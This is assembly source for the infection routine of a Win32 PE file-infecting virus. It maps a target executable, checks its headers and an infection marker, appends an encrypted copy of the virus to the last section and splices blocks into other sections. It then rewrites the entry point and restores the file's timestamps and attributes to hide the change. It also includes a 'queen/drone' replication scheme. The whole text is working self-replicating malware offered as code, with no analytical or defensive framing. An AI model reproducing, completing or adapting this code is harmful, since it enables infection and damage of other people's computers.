%define IB Infect_BlockDescryptor
    
%macro NASMHACKI 0 

;On Entry ebp Points To BlockDescriptor (Local DeltaOffset)
;edx is delta offset (Global Delta Offset)
Infect_BlockDescryptor:
Infect_StrainKey        DD 0
Infect_BlockSize        DD Infect_BlockTerminator - Infect_BlockDescryptor
Infect_CryptionArray_   DD Infect_CryptionArray-Infect_BlockDescryptor
Infect_Cryptions        DD 1
Infect_ImportArray_     DD Infect_ImportArray-Infect_BlockDescryptor
Infect_EntryPoint:
;Infect Current File
;InfectCurrentFile:



    mov  [ebp+GlobalDelta - IB],edx      ;Save Global Delta Offset
    push edx                             ;SAVE EDX
    
    ;Queen Shouldn't Always Replicate
    cmp  [edx+DroneFlag],DWORD 0
    jne   SkipQueenAbort
    call GetRandomNumber
    or   eax,0xFFFFFFFC
    xor  eax,0xFFFFFFFC
    cmp  eax,01            ;One In Three Chance Virus Will Replicate
    ;RETNE                  ;Return If Two In Three
SkipQueenAbort:
    
    ;Decide Here If This Will Be A Queen Generation Or A Drone Generation
    mov  [ebp+MakeDrone-IB], DWORD 0
    cmp  [edx+DroneFlag],DWORD 1         ;Drones Can Only Produce Drones
    je   Drone
    call GetRandomNumber ;Get Random Number In EAX
    or   eax,0xFFFFFFF8
    xor  eax,0xFFFFFFF8    ;00000111b
    
    cmp  eax,1             ;Queen On 1
    je   Queen
Drone:
    mov  [ebp+MakeDrone-IB], DWORD 1
Queen:

    ;Get File Attributes
    pop  edx                                   ;RESTORE EAX
    lea  eax,[edx+FD_FileName]                 ;Get Pointer To Filename
    push eax                                   ;push onto stack
    mov  eax,[ebp+K32GetFileAttributesA - IB]
    call eax                                   ;Call GetFileAttributesA
    mov  [ebp+OriginalFileAttributes - IB],eax ;Save File Attributes
    or   eax,eax                               ;Function Returns 0 On Error
    RETE                                       ;Return On Error
    
    mov  edx,[ebp+GlobalDelta - IB]            ;Get Global Delta
    
    push DWORD 0x80                            ;Set File To Normal Attributes
    lea  eax,[edx+FD_FileName]                 ;Get Pointer To Filename
    push eax                                   
    call [ebp+K32SetFileAttributesA - IB]      ;Call SetFileAttributes
    or   eax,eax                               ;Check For Error
    RETE                                       ;RET If EAX = 0
    
    mov  edx,[ebp+GlobalDelta - IB]            ;Get Global Delta
                                                                    
    ;Open The File
    push DWORD 0x0                         ;File Templete
    push DWORD 0x0                         ;File Attributes
    push DWORD 0x3                         ;Open Existing File
    push DWORD 0x0                         ;Default Security
    push DWORD 0x1                         ;File Shared For Read Access
    push DWORD (0x80000000 | 0x40000000)   ;Open For Read/Write Access
    lea  eax,[edx+FD_FileName]             ;Get Address Of FileName
    push eax
    call [ebp+K32CreateFileA-IB]     ;Call CreateFileA
    mov  [ebp+FileHandle - IB],eax   ;Save File Handle
    cmp  eax,0xFFFFFFFF              ;CMP For File Does Not Exist Error
    RETE                             ;Return On Error
    or   eax,eax                     ;Check For Error
    RETZ                             ;Abort If Error
    
    
    ;Save File Times
    lea  eax,[ebp+OriginalCreationTime-IB]  ;
    push eax                                ;
    lea  eax,[ebp+OriginalLastWriteTime-IB] ;
    push eax                                ;
    lea  eax,[ebp+OriginalLastAccessTime-IB];
    push eax                                ;
    push DWORD [ebp+FileHandle-IB]          ;Pass FileHandle
    call [ebp+K32GetFileTime-IB]            ;Get Them
    
    ;Save File Size
    push DWORD 0                          ;Where To Save The File Size
    push DWORD [ebp+FileHandle-IB]        ;Pass File Handle
    call [ebp+K32GetFileSize-IB]
    mov  [ebp+FileSize-IB],eax
    or   eax,eax                          ;Verify FileSize > 0
    RETE                                  ;Else Return 
    
    ;Get Amount Of Memory Needed For Mapping
    add eax,VIRUS_LENGTH                  ;eax = FileSize(still in eax) + VirusSize
    add eax,0x1000                        ;+ 0x1000       
    mov [ebp+MappingMemory-IB],eax        ;Save It
    
    ;We Dont Need Memory For The Queen Payload
    cmp [ebp+MakeDrone-IB],DWORD 0        ;Is This A Queen Generation
    je  SkipDroneTrim
    sub eax,QUEEN_CODE                    ;Subtract Size Of Queen Specific Code
    mov [ebp+MappingMemory-IB],eax        ;Save It
SkipDroneTrim:

    ;Create File Mapping
    push DWORD 0                          ;Name Of File Mapping Object (NULL)
    push eax                              ;Maximum Size Low (First 32bits)
    push DWORD 0                          ;Maximum Size High (Second 32bits)
    push DWORD 4                          ;Page read & write
    push DWORD 0                          ;security attributes
    push DWORD [ebp+FileHandle-IB]        ;File Handle
    call [ebp+K32CreateFileMapping-IB]    ;Make The Call
    mov  [ebp+MapHandle-IB],eax           ;Save Map Handle
    or   eax,eax                          ;EAX == 0 On Error
    JMPE close_file                       ;Close File And Return On Error (if 0)



    ;Map View Of File
    push DWORD [ebp+MappingMemory-IB]      ;bytes to map
    push DWORD 0                           ; file offset
    push DWORD 0                           ; "  " "    "
    push DWORD 2                           ; File Map Write Mode
    push eax                               ; File Map Handle (still in eax)
    call [ebp+K32MapViewOfFile-IB]         ; Call API
                                                 
    or   eax,eax                           ;EAX == 0 On Error
    JMPE close_map                         ;Close All And Return On Error
    mov  [ebp+MapAddress-IB],eax           ;Save Memory Address Where File Was Mapped To
    
    
    
    ;Verify The File Has A DOS-MZ-EXE Signature
    cmp [eax],WORD 0x5a4d
    JMPNE unview_map
    
    ;VerifyThe File Isnt Already Infected
    add  eax,0x12
    cmp  [eax],WORD 0xAFFF
    JMPE unview_map
    
    ;Verify The File Has A Win32-PE-EXE Signature
    add   eax,0x2a                           ;Move To PE Header Pointer
    mov   eax,[eax]                          ;Get Address
    add   eax,[ebp+MapAddress-IB]            ;Add Base
    cmp   [eax],WORD 'PE'                    ;Verify PE Signature
    JMPNE unview_map                         ;Abort If Not
    
    mov  esi,eax                            ;Base Of PE Header In ESI
    mov  [ebp+PEHeader-IB],esi              ;Save Base Of Pe Header
    
    
    mov  edx,[ebp+GlobalDelta-IB]            ;Get Global Delta Offset
    
    mov eax,[esi+0x28]                       ;Get Initial IP
    mov [edx+OriginalIP],eax                 ;Save Original Initial IP Of This File (To Global Data)
    
    mov eax,[esi+0x3c]                       ;Get File Alignment
    mov [ebp+FileAlignment-IB],eax           ;Save It
    
    cmp  [ebp+FileAlignment-IB],DWORD 0x1000 ;Make Sure File Alignment Is < 1Kb
    JMPA unview_map                          ;Abort If Not




    ;Locate Last Section In File
    mov ebx, [esi+0x74]                    ;Get Number Of Directory Entries In EBX
    shl ebx, 3                             ;Multiply By 8 Bytes (Size)
    
    xor  eax, eax                          ;Clear EAX
    mov  ax,WORD [esi+0x6]                 ;Get Number Of Sections In EAX
    mov  [ebp+NumberOfSections-IB],eax     ;Save Number Of Sections
    
    ;EBX = Total Size Of Data Directory
    ;EAX = Number Of Sections
    
    ;Get Address Of Last Sections Header Relative To Start Of Sections Header
    dec eax                                ;Sections - 1
    mov ecx, 0x28                          ;Multiply By Size Of Section Header
    mul ecx                                ;EAX = ECX * EAX
    
    ;Set ESI To Section Headers
    add esi, 0x78                          ;Goto Start Of Data Directory
    add esi, ebx                           ;Skip Past Data Directory
    mov [ebp+SectionHeaders-IB],esi        ;Save Address Of Section Headers
    
    ;Set ESI To Last Sections Header
    add esi, eax                           ;Skip To Last Section Header
    
    OR  DWORD [ESI+Characteristics],0xA0000020        ;Modify Flags To Executable(20000000),Writable(80000000),Code(00000020)


    ;Save All Data
    mov eax,[esi+VirtualSize]       ;Save VirtualSize
    mov [ebp+OldVirtualSize-IB],eax
    
    mov eax,[esi+VirtualAddress]    ;Save VirtualAddress
    mov [ebp+OldVirtualAddress-IB],eax
    
    mov eax,[esi+SizeOfRawData]     ;Save SizeOfRawData
    mov [ebp+OldSizeOfRawData-IB],eax
    
    mov eax,[esi+PointerToRawData]  ;Save PointerToRawData
    mov [ebp+OldPointerToRawData-IB],eax
    
    
    
    ;Update Section Sizes
    mov eax,[esi+VirtualSize]   
    cmp eax,[esi+SizeOfRawData] 
    jnb .1                      ;if (VirtualSize >= SizeOfRawData)
    mov eax,[esi+SizeOfRawData] 
    mov [esi+VirtualSize],eax
.1:
          
    add [esi+VirtualSize],DWORD VIRUS_LENGTH   ;Add Virus Length To VirtualSize
    add [esi+SizeOfRawData],DWORD VIRUS_LENGTH ;Add Virus Length To SizeOfRawData
    
    
    
    
    
    mov  esi,[ebp+PEHeader-IB]            ;Restore Base Of Pe Header
    
    
    ;Get Required Padding
    mov eax, VIRUS_LENGTH                ;Virus Length
    mov ecx, [ebp+FileAlignment-IB]      ;Get File Alignment
    div ecx                              ;EDX = Remainder Of VirtualSize / FileAlign (ECX = EAX % ECX)
    mov ecx, [ebp+FileAlignment-IB]      ;Get File Alignment Again
    sub ecx, edx                         ;ECX = FileAlign - (FileAlign % VirtualSize)
    mov [ebp+Padding-IB], ecx            ;Save Required Padding
     
    ;Update The Size Of The Image
    mov eax,VIRUS_LENGTH                  ;Get The Size Of The Virus
    add eax,[ebp+Padding-IB]              ;Add Padding
    add [esi+0x50],eax                    ;Add It To SizeOfImage

    mov edx,[ebp+GlobalDelta-IB]          ;Get Global Delta Offset

    ;Update ImageBase (This Wont Effect The Virus Assuming Everything From Here On Wont Use The ImageBase Variable)
    mov eax,[esi+0x34]                    ;Get ImageBase
    mov [edx+ImageBase],eax               ;Save It
    
    
    
    
    
    
    
    
    ;Start The Midinfection Proccess
StartMidinfection:
    ;Initiate GetHostBlock
    call InitiateGetHostBlock
    
    ;Relocate Payload Block
    mov  edx,[ebp+GlobalDelta-IB]           ;Get Global Delta Offset
    mov  [edx+PayloadBDA],DWORD 0           ;ClearPayloadBDA
    lea  eax,[edx+Payload_BlockDescryptor]
    mov  ecx,[eax+BLOCKDESCRYPTOR_BLOCKSIZE];ECX = Block Size
    push ecx                                ;SAVE ECX
    mov  edx,eax                            ;EDX = BDA
    mov  esi,[ebp+PEHeader-IB]              ;ESI = PE Header
    call GetHostBlock
    pop  ecx                                ;RESTORE ECX
    
    cmp  esi,0                              ;Check For Error
    JMPE Payload_Relocation_Fail
    
    
    
    
    ;ESI = Address In Loaded File
    ;EDX = Address In Target When Run
    mov  [ebp+ExchangeBack-IB],esi          ;We Have To Get The Block Back For The Next File Infection
    push edx                               ;SAVE EDX
    mov  edx,[ebp+GlobalDelta-IB]          ;Get Global Delta Offset
    
    lea  edi,[edx+Payload_BlockDescryptor] ;Destination Is Where Payload Was (ECX and ESI are loaded)
    cmp  [ebp+MakeDrone-IB],DWORD 0        ;Is This A Queen Payload
    je   .1
    lea  edi,[edx+PayloadDrone_BlockDescryptor] ;If Not Then Use Drones Payload
.1:
    
    call InfectExchangeData
    
    mov  eax,[ebp+MapAddress-IB]
    
    pop  edx                               ;RESTORE EDX
    mov  ebx,[ebp+GlobalDelta-IB]          ;Get Global Delta Offset
    mov  [ebx+PayloadBDA],edx              ;Update PayloadBDA
    
    jmp Payload_Relocation_Ok
    
    
    
    Payload_Relocation_Fail:
    mov  [ebp+ExchangeBack-IB],DWORD 0     ;No Need To Copy It Back
    Payload_Relocation_Ok:
    
    
    DebugMarker
    DebugMarker
    DebugMarker
    ;Set RegionVA For Sentry Block
    mov  edx,[ebp+GlobalDelta-IB]           ;Get Global Delta Offset
    mov  eax,[ebp+OldVirtualAddress-IB]     ;Get VirtualAddress Of Section
    add  eax,[ebp+OldSizeOfRawData-IB]      ;Add SizeOfRawData
    add  eax,[edx+ImageBase]                ;Add Updated ImageBase
    mov  [edx+RegionVA],eax
    
    
;Relocate The Sentry Block
    mov  edx,[ebp+GlobalDelta-IB]           ;Get Global Delta Offset
    mov  [edx+SentryBDA],DWORD 0            ;Clear Sentry BDA
    lea  eax,[edx+Sentry_BlockDescryptor]
    mov  ecx,[eax+BLOCKDESCRYPTOR_BLOCKSIZE];ECX = Block Size
    push ecx                                ;SAVE ECX
    mov  edx,eax                            ;EDX = BDA
    mov  esi,[ebp+PEHeader-IB]              ;ESI = PE Header
    call GetHostBlock
    pop  ecx                                ;RESTORE ECX
    
    cmp  esi,0                              ;Check For Error
    JMPE Sentry_Relocation_Fail

;Swap It To Host Space    
    ;ESI = Address In Loaded File
    ;EDX = Address In Target When Run
    mov  [ebp+SentryExchangeBack-IB],esi   ;We Have To Get The Block Back For The Next File Infection
    push edx                               ;SAVE EDX
    mov  edx,[ebp+GlobalDelta-IB]          ;Get Global Delta Offset
    
    lea  edi,[edx+Sentry_BlockDescryptor]  ;Destination Is Where Sentry Was (ECX and ESI are loaded)
    
    call InfectExchangeData                ;Exchange The Data
    
    mov  eax,[ebp+MapAddress-IB]
    
    pop  edx                               ;RESTORE EDX
    mov  ebx,[ebp+GlobalDelta-IB]          ;Get Global Delta Offset
    mov  [ebx+SentryBDA],edx               ;Update SentryBDA
    
    jmp Sentry_Relocation_Ok
    
Sentry_Relocation_Fail:
    mov  [ebp+SentryExchangeBack-IB],DWORD 0 ;Dont Need To Copy It Back
Sentry_Relocation_Ok:
    
    DebugMarker
    DebugMarker
    DebugMarker
    
    
    ;Set The Programs Entry Point
    mov  esi,[ebp+PEHeader-IB]            ;Restore Base Of Pe Header
    
    mov  edx,[ebp+GlobalDelta-IB]         ;Get Global Delta
    cmp  [edx+SentryBDA],DWORD 0          ;BDA In VSpace?
    je   EntryPointInVSpace               ;If So Then...

    mov  eax,[edx+SentryBDA]              ;Address Of BDA In Host
    add  eax,BLOCKDESCRYPTOR_SIZE         ;Entry Point Of Block
    sub  eax,[edx+ImageBase]              ;Make It An RVA
    mov  [esi+0x28],eax                   ;Set The Entry Point
    jmp  EntryPointOk
EntryPointInVSpace:
    mov  eax,[ebp+OldVirtualAddress-IB]   ;Get VirtualAddress Of Section
    add  eax,[ebp+OldSizeOfRawData-IB]    ;Add SizeOfRawData
    add  eax,Sentry_BlockDescryptor - START_OF_VIRUS ;Sentry Block Relative To Start Of Virus
    add  eax,BLOCKDESCRYPTOR_SIZE         ;Entry Point Of Block
    mov  [esi+0x28],eax                   ;Set The Entry Point
EntryPointOk:
    
    
    
;NOW RELOCATE _THIS_ BLOCK!
    DebugMarker
    mov  ecx,[ebp+BLOCKDESCRYPTOR_BLOCKSIZE];ECX = Block Size
    mov  esi,[ebp+PEHeader-IB]              ;ESI = PE Header
    call GetHostBlock
    
    cmp  esi,0
    je   InfectRelocationFail

    mov  eax,[ebp+GlobalDelta-IB]          ;Get Global Delta Offset
    mov  [eax+InfectBDA],edx               ;Where This Block Is Located In Host File

    mov  ecx,[ebp+BLOCKDESCRYPTOR_BLOCKSIZE];Get This Blocks Size
    mov  edx,[ebp+GlobalDelta-IB]           ;Get Global Delta Offset
    ;ESI = Address To Relocate To
    ;ECX = Block Size
    ;EDX = Global Delta Offset
    ;EBP = Infect Blocks Local Delta Ofsset (Block Delta)
    ;Swap Over To Host Space
    call RelocateInfectBlock               ;In Virus Space Relative Calls Are Still Ok
    
    mov  [ebp+InfectExchangeBack-IB],DWORD 1;Re-Relocation Flag
    
    jmp  InfectRelocationOk
    InfectRelocationFail:
    mov  [ebp+InfectExchangeBack-IB],DWORD 0;No Need To Exchange Back
    mov  edx,[ebp+GlobalDelta-IB]
    mov  [edx+InfectBDA],DWORD 0           ;0 == Infect Block Is In Virus Space
    
    InfectRelocationOk:
    
    
    
    DebugMarker
    
    
    
    
    
    
    
    ;Drone Flag Update
    mov  edx,[ebp+GlobalDelta-IB]    ;Get Global Delta Offset
    push DWORD [edx+DroneFlag]       ;Save Our Drone Flag
    mov  eax,[ebp+MakeDrone-IB]      ;Get Make Drone Flag
    mov  DWORD [edx+DroneFlag],eax   ;Update Drone Flag
    
    
    ;ENCRYPT MAIN VIRUS BODY
    mov  edx,[ebp+GlobalDelta-IB]
    lea  eax,[edx+START_OF_VIRUS]
    push eax                        ;SAVE VIRUS START
    mov  edx,eax
    mov  ECX,END_OF_ENCRYPTION_BOUNDRY - START_OF_VIRUS
    call InfectEncrypt
    
    
    pop  esi                        ;RESTORE VIRUS START
    ;Copy Virus To End Of Section       
    ;Copy Destination
    mov eax,[ebp+OldPointerToRawData-IB]  ;Offset Of Sections Data In File
    add eax,[ebp+OldSizeOfRawData-IB]     ;Add Size Of Sections Raw Data In File (Old Size)
    add eax,[ebp+MapAddress-IB]           ;Add Base Address Of Map
    mov edi,eax                           ;Mov Into EDI
    ;Copy Source (Source In ESI)
    mov ecx,VIRUS_LENGTH                  ;Number Of Bytes To Copy    
    rep movsb                             ;Move ECX Bytes
    
    
    ;DECRYPT MAIN VIRUS BODY
    mov  edx,[ebp+GlobalDelta-IB]
    lea  eax,[edx+START_OF_VIRUS]
    mov  edx,eax
    mov  ECX,END_OF_ENCRYPTION_BOUNDRY - START_OF_VIRUS
    call InfectDecrypt
    
    
    ;Drone Flag Restore
    mov  edx,[ebp+GlobalDelta-IB]    ;Get Global Delta Offset  
    pop  DWORD [edx+DroneFlag]       ;Restore Our Drone Flag
    
        
    ;Restore Infect Block
    mov eax,[ebp+InfectExchangeBack-IB]
    cmp eax,0
    je  ReturnInfectBlock_Return        ;Skip Past This If We Dont Need To Do It
        
    ;Now Swap Back To Virus Space
    mov  edx,[ebp+GlobalDelta-IB]    ;Get The Global Delta Offset
    lea  eax,[edx+ReturnInfectBlock] ;Load The Effective Address Of ReturnInfectBlock
    mov  ebx,ReturnInfectBlock_Return-IB
    add  ebx,ebp                     ;Add Base
    push ebx                         ;Return Address
    push eax                         ;Destination Address
    RET                              ;This Will Take Us To The DWORD On Stack
ReturnInfectBlock_Return:            ;EIP Will Land Here
    
                    
;If We Got This File The Rest Is Easy                                    
                                                    
                
                            
    ;Mark File As Infected
    mov esi,[ebp+MapAddress-IB]              
    mov [esi+0x12],DWORD 0xAFFF           ;Save It To The DOS-MZ-EXE File CheckSum
    
    
    ;Restore The Sentry Block
    mov esi,[ebp+SentryExchangeBack-IB]
    cmp esi,0
    je  SkipSentryRestore                ;No Need To Restore It
    
    mov edx,[ebp+GlobalDelta-IB]            ;Global Delta Offset
    lea edi,[edx+Sentry_BlockDescryptor]    ;Destination Is Original Location
    mov ecx,[esi+BLOCKDESCRYPTOR_BLOCKSIZE] ;Block Size
    rep movsb
SkipSentryRestore:
    
    
    ;Now Restore The Payload Block
    mov esi,[ebp+ExchangeBack-IB]                         
    cmp esi,0
    je  .1
    
    mov edx,[ebp+GlobalDelta-IB]            ;Global Delta Offset
    lea edi,[edx+Payload_BlockDescryptor]   ;Destination Is Original Location
    cmp [ebp+MakeDrone-IB],DWORD 0          ;Is This A Drone
    je  .2                                  ;
    lea edi,[edx+PayloadDrone_BlockDescryptor];If So Then Restore To Drone Payload
.2:
    
    mov ecx,[esi+BLOCKDESCRYPTOR_BLOCKSIZE] ;Block Size
    rep movsb
.1:
    
    
    DebugMarker
    DebugMarker
    
    
    ;Begin Cleanup
    
    ;UnMap Viewing
unview_map:
    push DWORD [ebp+MapAddress-IB]         ;Push The Mapping Address
    call [ebp+K32UnmapViewOfFile-IB]       ;Unmap Viewing 
    
    ;Close File Mapping
close_map:
    push DWORD [ebp+MapHandle-IB]          ;Pass The Map Handle
    call [ebp+K32CloseHandle-IB]           ;Close It
        
    ;Restore File Times
    lea  eax,[ebp+OriginalCreationTime-IB]   
    push eax                              ;
    lea  eax,[ebp+OriginalLastWriteTime-IB]  
    push eax                              ;
    lea  eax,[ebp+OriginalLastAccessTime-IB] 
    push eax                              ;
    push DWORD [ebp+FileHandle-IB]        ;
    call [ebp+K32SetFileTime-IB]          ;


    
    ;Move File Pointer To End Of File
    push DWORD 0                                 ;
    push DWORD 0                                 ;
    mov  eax,[ebp+FileSize-IB]                   ;Get Original File Size
    add  eax,VIRUS_LENGTH                        ;Add Virus Length
    add  eax,[ebp+Padding-IB]                    ;Add Padding To File Alignment Boundry
    push eax                                     ;Pass It
    push DWORD [ebp+FileHandle-IB]               ;
    call [ebp+K32SetFilePointer-IB]              ;Call SetFilePointer
                                                
    ;Mark The End Of The File (EOF)
    push DWORD [ebp+FileHandle-IB]               ;Pass The File Handle
    call [ebp+K32SetEndOfFile-IB]                ;SetEndOfFile
    
    ;Close The File
close_file:
    push dword [ebp+FileHandle-IB]   ;Pass The Opened Files Handle
    call [ebp+K32CloseHandle-IB]     ;Close The File
    
    ;Get Global Delta Offset In EDX Register
    mov  edx,[ebp+GlobalDelta - IB]
    
    ;Restore File's Attributes.
    push DWORD [ebp+OriginalFileAttributes - IB]   ;Push The Original File Attributes Onto The Stack.
    lea  eax,[edx+FD_FileName]                     ;Push The File Name Onto The Stack.
    push eax
    call [ebp+K32SetFileAttributesA-IB]            ;Make The Call
    
    
    ret
    
;Find A Loadable Program Section
;Return Address To Save To
;Caller Should Then Save Section Data Somewhere And Then Copy Block
;After Block Is User In Next Generation Program Should Restore Section Data
;EDX = BDA
;ECX = Block Size
;ESI = PE Header
RawSectionAddress   DD 0;
RawSectionRemaining DD 0;
RawSectionNumber    DD 0;
OutOfSectionData    DD 0;
RawSectionHeader    DD 0;Address Of Current Sections Header
RawSectionSize      DD 0;

InitiateGetHostBlock:
    mov [ebp+RawSectionAddress-IB],DWORD 0
    mov [ebp+RawSectionRemaining-IB],DWORD 0
    mov [ebp+RawSectionNumber-IB],DWORD 0
    mov [ebp+OutOfSectionData-IB],DWORD 0
    
    mov  esi,[ebp+SectionHeaders-IB]     ;Get Address Of Section Headers
    
    mov  [ebp+RawSectionHeader-IB],esi                     ;Save Address Of Section Header
    mov  eax,[esi+PointerToRawData]                     ;Get Offset Of Sections Data In File
    mov  [ebp+RawSectionAddress-IB],eax                    ;Save It
    mov  eax,[ebp+MapAddress-IB]                           ;Get Base Address Of Data
    add  [ebp+RawSectionAddress-IB],eax                    ;Add It To RawSectionAddress
    mov  eax,[esi+SizeOfRawData]                        ;Get Size Of Raw Section Data    
    mov  [ebp+RawSectionRemaining-IB],eax                  ;Save It
    
    ;if VirtualSize < RawSectionRemaining
    ;   then RawSectionRemaining = VirtualSize
    mov  eax,[esi+VirtualSize]
    cmp  eax,[ebp+RawSectionRemaining-IB]
    jae  .1
    mov  eax,[esi+VirtualSize] 
    mov  [ebp+RawSectionRemaining-IB],eax
.1:

    OR  DWORD [ESI+Characteristics],0xA0000020          ;Modify Flags To Executable(20000000),Writable(80000000),Code(00000020)
    
    mov  eax,[ebp+RawSectionRemaining-IB]    ;
    mov  [ebp+RawSectionSize-IB],eax         ;Get RawSectionSize
    RET

GetHostBlock:

    mov eax,[ebp+RawSectionRemaining-IB] 
    cmp eax,ecx                       ;
    CALLBE GetNewSection              ;if(RawSectionRemaining <= ECX)
                                      ;then Get New Section
    cmp [ebp+OutOfSectionData-IB],DWORD 1;Check For Error
    JNE .1
    mov  esi,0                        ;Clear ESI On Error
    RET                               ;Return
.1:

    mov  esi,[ebp+RawSectionAddress-IB];Get ESI
    
    ;Verify That New Section Has Enough Data
    mov eax,[ebp+RawSectionRemaining-IB];
    cmp eax,ecx                       ;
    JMPBE GetHostBlock                ;Get A New Section If So
    
    mov eax,[ebp+RawSectionHeader-IB] ;Get Address Of Section Header
    mov edx,[eax+VirtualAddress]      ;Get Sections VirtualAddress
    add edx,[ebp+RawSectionSize-IB]   ;Add Size Of Raw Data
    sub edx,[ebp+RawSectionRemaining-IB];Subtract Raw Data Remaining
    mov ebx,[ebp+GlobalDelta-IB]      ;Get The Global Delta Offset
    add edx,[ebx+ImageBase]           ;Add The (Updated)Image Base
    
    sub [ebp+RawSectionRemaining-IB],ecx ;Subtract BlockSize From RawSectionRemaining
    add [ebp+RawSectionAddress-IB],ecx   ;Increase Address
    
    ret                               ;Succes
    
;Retrieve Section Data To Save To
GetNewSection:
    mov  [ebp+OutOfSectionData-IB],DWORD 1;Set Error Flag
    PUSHAD                                ;SAVE ALL 32Bit REGISTERS
    
    ;Move To Next Section    
MoveToNextSection:
    inc  DWORD [ebp+RawSectionNumber-IB];Increase RawSectionNumber
    
    mov  eax,[ebp+NumberOfSections-IB];Get Number Of Sections
    dec  eax                          ;-1
    
    
    
    
    
    cmp  eax,[ebp+RawSectionNumber-IB];Compare It To RawSectionNumber
    ja   .1                           ;Return if(RawSectionNumber >= NumberOfSections)
                                      ;^Dont Return Last Section
    popa                              ;RESTORE ALL 32Bit REGISTERS
    RET                               
.1:
    
    mov  eax,[ebp+RawSectionNumber-IB];Get Raw Section Number
    mov  EDX,0x28                     ;Multiply By Size Of Section Header
    mul  EDX                          ;^
    
    add  eax,[ebp+SectionHeaders-IB]  ;Add Address Of Section Headers
    mov  esi,eax                      ;ESI = Address Of New Section Header
    mov  [ebp+RawSectionHeader-IB],esi;Save Address Of Sections Header
    
    ;Get Data From The Section Header
GetSectionHeaderData:
    mov  eax,[esi+PointerToRawData]                     ;Get Offset Of Sections Data In File
    mov  [ebp+RawSectionAddress-IB],eax                 ;Save It
    mov  eax,[ebp+MapAddress-IB]                        ;Get Base Address Of Data
    add  [ebp+RawSectionAddress-IB],eax                 ;Add It To RawSectionAddress
    mov  eax,[esi+SizeOfRawData]                        ;Get Size Of Raw Section Data    
    mov  [ebp+RawSectionRemaining-IB],eax               ;Save It
    
    ;if VirtualSize < RawSectionRemaining
    ;   then RawSectionRemaining = VirtualSize
    mov  eax,[esi+VirtualSize]
    cmp  eax,[ebp+RawSectionRemaining-IB]
    jae  .1
    mov  eax,[esi+VirtualSize] 
    mov  [ebp+RawSectionRemaining-IB],eax
.1:
    
    mov  eax,[ebp+RawSectionRemaining-IB]    ;
    mov  [ebp+RawSectionSize-IB],eax         ;Get RawSectionSize
    
    
    ;Modify Flags
    OR  DWORD [ESI+Characteristics],0xA0000020          ;Modify Flags To Executable(20000000),Writable(80000000),Code(00000020)
    
    
    POPAD                              ;RESTORE ALL 32Bit REGISTERS
    mov  DWORD [ebp+OutOfSectionData-IB],0;Clear Error Flag
    ret

;Exchange Two Regions Of Data
;ESI = Region 1
;EDI = Region 2
;ECX = Number Of Bytes To Copy
InfectExchangeData:
.1:
    mov  DH  ,[esi]          ;Exchagne Bytes
    mov  DL  ,[edi]
    mov  [esi],DL
    mov  [edi],DH
    
    inc  esi                   ;Increment ESI
    inc  edi                   ;Increment EDI
    loop .1                    ;Loop For All Bytes
    RET

GetRandomNumber:
    call [ebp+K32GetTickCount-IB]    ;GetTickCount in EAX
    mov  CL,AL
    rol  AH,CL
    RET
    
InfectEncrypt:
    mov Esi,Edx
    DEC ECX
.1:
    LODSB      
    XCHG AH,AL
    LODSB
    XOR AL,AH  
    DEC ESI
    MOV [ESI],AL
    LOOP .1
    RET




InfectDecrypt:
    DEC ECX
    ADD EDX,ECX
    MOV ESI,EDX
.1:
    LODSB
    DEC  ESI
    DEC  ESI
    XOR  AL,[esi]
    MOV  [esi+1],AL
    LOOP .1;for
    RET



Infect_CryptionArray:
DD    0
DD    0

;All The Imports Stuff
GFAA_NAME                DB "GetFileAttributesA",0
SFAA_NAME                DB "SetFileAttributesA",0
CFA_NAME                 DB "CreateFileA",0
CH_NAME                  DB "CloseHandle",0
GFT_NAME                 DB "GetFileTime",0
GFS_NAME                 DB "GetFileSize",0
CFM_NAME                 DB "CreateFileMappingA",0 
MVOF_NAME                DB "MapViewOfFile",0
UVOF_NAME                DB "UnmapViewOfFile",0
SFT_NAME                 DB "SetFileTime",0
SFP_NAME                 DB "SetFilePointer",0
SEOF_NAME                DB "SetEndOfFile",0
GTC_NAME                 DB "GetTickCount",0
Infect_ImportArray:
DD 13                                           ;Number Of Imports
GFAA_NAMEA               DD GFAA_NAME - Infect_BlockDescryptor     
K32GetFileAttributesA    DD 0x10 ;
SFAA_NAMEA               DD SFAA_NAME - Infect_BlockDescryptor     
K32SetFileAttributesA    DD 0 ;
CFA_NAMEA                DD CFA_NAME  - Infect_BlockDescryptor     
K32CreateFileA           DD 0 ;
CH_NAMEA                 DD CH_NAME   - Infect_BlockDescryptor     
K32CloseHandle           DD 0 ;
GFT_NAMEA                DD GFT_NAME  - Infect_BlockDescryptor     
K32GetFileTime           DD 0 ;
GFS_NAMEA                DD GFS_NAME  - Infect_BlockDescryptor     
K32GetFileSize           DD 0 ;
CFM_NAMEA                DD CFM_NAME  - Infect_BlockDescryptor     
K32CreateFileMapping     DD 0 ;
MVOF_NAMEA               DD MVOF_NAME - Infect_BlockDescryptor     
K32MapViewOfFile         DD 0 ;
UVOF_NAMEA               DD UVOF_NAME - Infect_BlockDescryptor     
K32UnmapViewOfFile       DD 0 ;
SFT_NAMEA                DD SFT_NAME  - Infect_BlockDescryptor     
K32SetFileTime           DD 0 ;
SFP_NAMEA                DD SFP_NAME  - Infect_BlockDescryptor     
K32SetFilePointer        DD 0 ;
SEOF_NAMEA               DD SEOF_NAME - Infect_BlockDescryptor     
K32SetEndOfFile          DD 0 ;
GTC_NAMEA                DD GTC_NAME - Infect_BlockDescryptor 
K32GetTickCount          DD 0 ;

;stick data here:
GlobalDelta            DD 0

OriginalFileAttributes DD 0                    ;Attributes Of Current File
FileHandle             DD 0                    ;Handle To Opened File
OriginalCreationTime   DD 0
                       DD 0
OriginalLastWriteTime  DD 0
                       DD 0
OriginalLastAccessTime DD 0
                       DD 0
FileSize               DD 0
MappingMemory          DD 0                    ;Amount Of Memory Needed For Mapping/New File Size
MapHandle              DD 0                    ;Handle For File Mapping
MapAddress             DD 0                    ;Address To Where File Was Mapped
PEHeader               DD 0 ;Address Of PE Header
FileAlignment          DD 0                    ;File Alignment Extracted From PE Header
NumberOfSections       DD 0;Number Of Section Headers
SectionHeaders         DD 0 ;Address Of Section Tables/Headers 
OldVirtualSize         DD 0 ;
OldVirtualAddress      DD 0 ;
OldSizeOfRawData       DD 0 ;
OldPointerToRawData    DD 0 ;
Padding                DD 0 ;
ExchangeBack           DD 0 ;
InfectExchangeBack     DD 0 ;
MakeDrone              DD 0 ;
SentryExchangeBack     DD 0 ;

Infect_BlockTerminator:

%endmacro
    
    
    


